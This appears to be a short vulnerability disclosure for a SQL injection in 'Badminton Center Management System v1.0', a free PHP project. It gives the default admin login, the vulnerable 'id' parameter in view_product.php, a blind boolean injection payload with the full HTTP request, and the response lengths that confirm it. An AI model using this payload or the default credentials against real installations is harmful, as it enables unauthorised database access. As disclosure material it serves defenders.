# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: bcms/admin/products/view_product.php?id=

Vulnerability location: /bcms/admin/products/view_product.php?id=,id

[+] Payload: /bcms/admin/products/view_product.php?id=5%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /bcms/admin/products/view_product.php?id=5%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 847
![image](https://user-images.githubusercontent.com/54017627/170621038-ca5be1b1-51d3-4a02-a0c5-20247efc0903.png)

![image](https://user-images.githubusercontent.com/54017627/170620919-afe2eb47-846f-405f-910b-eec2f66ea03b.png)

When length (database ()) = 7, Content-Length: 725
![image](https://user-images.githubusercontent.com/54017627/170621004-78b6b672-28c2-4c2d-b8d4-ff149f9842cb.png)

![image](https://user-images.githubusercontent.com/54017627/170620903-d521b4da-1f0d-4ec8-8371-05ef55d3ac4e.png)
